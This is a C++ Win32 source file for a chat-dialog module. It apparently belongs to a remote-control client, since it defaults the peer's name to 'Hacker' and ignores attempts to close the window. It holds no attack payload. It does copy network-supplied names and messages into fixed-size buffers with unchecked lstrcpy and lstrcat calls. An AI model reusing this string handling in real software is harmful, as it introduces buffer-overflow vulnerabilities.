#include "Chat.h"
#include <client.h>
#include <dbg.h>

#define IDD_CHAT_DLG                    101
#define ID_MSGLIST                      1000
#define ID_INPUT                        1001


CChat::CChat(CClient *pClient, Module  * owner) :
CEventHandler(pClient, CHAT)
{
	m_hInit = NULL;
	m_hDlg = NULL;
	m_hWndThread = NULL;
	m_dwThreadId = 0;
	m_owner = owner;

	memset(m_szPeerName, 0, sizeof(m_szPeerName));

	if (m_owner)
		get_module(m_owner);
}


CChat::~CChat()
{
	dbg_log("CChat::~CChat()");
	if (m_owner)
		put_module(m_owner);
}

//假设对话框不可能由client关闭,只能由客户端断开.;
LRESULT CALLBACK CChat::DlgProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	TCHAR Msg[8192] = { 0 };
	TCHAR buffer[4096];
	HWND hInput;
	HWND hMsgList;
	LPCREATESTRUCTW pCreateStruct = NULL;
	//不能用static 变量(开启多个对话框的时候会乱套)
	CChat*pChat = (CChat*)GetWindowLongPtr(hWnd, GWLP_USERDATA);

	switch (uMsg)
	{
	case WM_CREATE:
		pCreateStruct = (LPCREATESTRUCTW) lParam;
		SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pCreateStruct->lpCreateParams);
		break;

	case WM_CLOSE:		//ignore close msg;
		break;

	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			
			if(pChat)
			{
				hInput= GetDlgItem(pChat->m_hDlg, ID_INPUT);
				hMsgList = GetDlgItem(pChat->m_hDlg, ID_MSGLIST);
				GetWindowText(hInput, buffer, 4095);

				if(lstrlen(buffer) == 0)
					break;

				SetWindowText(hInput, TEXT(""));
				pChat->Send(CHAT_MSG,buffer,sizeof(TCHAR)*(lstrlen(buffer) + 1));

				//把自己发送的内容显示到屏幕上;
				lstrcat(Msg, TEXT("[me]:"));
				lstrcat(Msg, buffer);
				lstrcat(Msg, TEXT("\r\n"));
				SendMessage(hMsgList, EM_SETSEL, -1, 0);
				SendMessage(hMsgList, EM_REPLACESEL, FALSE, (LPARAM)Msg);
			}
			break;
		case IDCANCEL:
			break;
		}
		break;
	
	case WM_DESTROY:
		DestroyWindow(hWnd);
		break;

	default:
		return DefWindowProc(hWnd,uMsg,wParam,lParam);
	}
	return 0;
}


void CChat::ThreadProc(CChat*pChat)
{
	HINSTANCE hInstance = GetModuleHandle(NULL);
	static int HasRegister = 0;

	if(!HasRegister)
	{
		WNDCLASS wndclass      = {0};
		wndclass.hInstance     = hInstance;
		wndclass.lpfnWndProc   = DlgProc;
		wndclass.lpszClassName = TEXT("ChatBoxDlgClass");
		wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
		wndclass.hCursor       = (HCURSOR)LoadCursorA(hInstance,MAKEINTRESOURCEA(IDC_ARROW));
	
		wndclass.style = CS_HREDRAW|CS_VREDRAW;	
		HasRegister = (RegisterClass(&wndclass) != 0);
	}

	pChat->m_hDlg = NULL;

	if(HasRegister)
	{
		RECT rect;
		pChat->m_hDlg  = CreateWindow(
			TEXT("ChatBoxDlgClass"),
			TEXT("Chat Box"),
			DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			466,
			266,
			NULL,
			NULL,
			hInstance,
			(void*)pChat);
		
		GetClientRect(pChat->m_hDlg,&rect);
		//hide window
		
		//Create Button
		CreateWindow(
			TEXT("button"), 
			TEXT("Send"), 
			WS_CHILD | WS_VISIBLE, 
			rect.right - 60,
			rect.bottom - 24,
			60,
			24,
			pChat->m_hDlg,
			(HMENU)IDOK,
			hInstance,
			0);
		
		//Create MsgList
		CreateWindow(
			TEXT("Edit"), 
			TEXT(""),
			WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY| ES_AUTOHSCROLL | WS_VSCROLL,
			0,
			0,
			rect.right,
			rect.bottom - 24,
			pChat->m_hDlg,
			(HMENU)ID_MSGLIST,
			hInstance,
			NULL);
		
		//Create Input Box
		CreateWindow(
			TEXT("Edit"), 
			TEXT(""), 
			WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
			0,
			rect.bottom - 24,
			rect.right - 60,
			24,
			pChat->m_hDlg,
			(HMENU)ID_INPUT,
			hInstance,
			0);
	}
	//
	//enable(false) send button
	HWND hCtrl = GetDlgItem(pChat->m_hDlg, IDOK);
	EnableWindow(hCtrl, FALSE);

	SetEvent(pChat->m_hInit);
	MSG msg = { 0 };

	while (GetMessage(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	//退出了.;
	DestroyWindow(pChat->m_hDlg);
	pChat->m_hDlg = NULL;
}

BOOL CChat::ChatInit()
{
	BOOL bResult = FALSE;
	m_hInit = CreateEvent(0, 0, FALSE, NULL);
	if (m_hInit == NULL)
		return FALSE;
	//创建线程;
	m_hWndThread = CreateThread(
		0, 
		0, 
		(LPTHREAD_START_ROUTINE)
		ThreadProc,
		this,
		0,
		&m_dwThreadId);

	if (m_hWndThread == 0)
	{
		return FALSE;
	}

	//等待线程创建窗口完毕;
	WaitForSingleObject(m_hInit, INFINITE);
	CloseHandle(m_hInit);
	m_hInit = NULL;
	
	if (m_hDlg == NULL)				//失败.;
		return FALSE;

	return TRUE;
}
void CChat::OnOpen()
{
	DWORD dwStatu = ChatInit();
	Send(CHAT_INIT, &dwStatu, sizeof(dwStatu));
}
void CChat::OnClose()
{
	if (m_hDlg)
	{
		PostMessage(m_hDlg, WM_DESTROY, 0, 0);
		m_hDlg = NULL;
	}

	//结束了.;
	if (m_dwThreadId)
	{
		//
		PostThreadMessage(m_dwThreadId, WM_QUIT, 0, 0);
		WaitForSingleObject(m_hWndThread,INFINITE);
		CloseHandle(m_hWndThread);

		m_hWndThread = NULL;
		m_dwThreadId = NULL;
	}

	if (m_hInit)
	{
		CloseHandle(m_hInit);
		m_hInit = NULL;
	}
}

void CChat::OnChatBegin(DWORD dwRead, TCHAR*NickName)
{
	if (dwRead == 0 || !NickName[0])
	
	{
		lstrcpy(m_szPeerName, TEXT("Hacker"));
	}
	else{
		lstrcpy(m_szPeerName, NickName);
	}

	if (m_hDlg)
	{
		TCHAR Title[256] = {0};

		lstrcpy(Title,TEXT("Chating with "));
		lstrcat(Title,m_szPeerName);
		
		SetWindowText(m_hDlg,Title);
		
		//Show dlg
		ShowWindow(m_hDlg, SW_SHOW);
		
		//enable (true) send button.
		EnableWindow(GetDlgItem(m_hDlg, IDOK), TRUE);
	}
}

void CChat::OnChatMsg(DWORD dwRead, TCHAR*szMsg)
{
	TCHAR Msg[8192] = { 0 };
	//显示到对话框里面;
	if (m_hDlg)
	{
		HWND hCtrl = GetDlgItem(m_hDlg, ID_MSGLIST);
		//末尾追加数据.;
		Msg[0] = '[';

		lstrcat(Msg, m_szPeerName);
		lstrcat(Msg, TEXT("]:"));
		lstrcat(Msg, szMsg);
		lstrcat(Msg,TEXT("\r\n"));

		SendMessage(hCtrl, EM_SETSEL, -1, 0);
		SendMessage(hCtrl, EM_REPLACESEL, FALSE, (LPARAM)Msg);
	}
}
void CChat::OnEvent(UINT32 e, BYTE* lpData, UINT Size)
{
	switch (e)
	{
	case CHAT_BEGIN:
		OnChatBegin(Size, (TCHAR*)lpData);
		break;
	case CHAT_MSG:
		OnChatMsg(Size, (TCHAR*)lpData);
		break;
	default:
		break;
	}
}
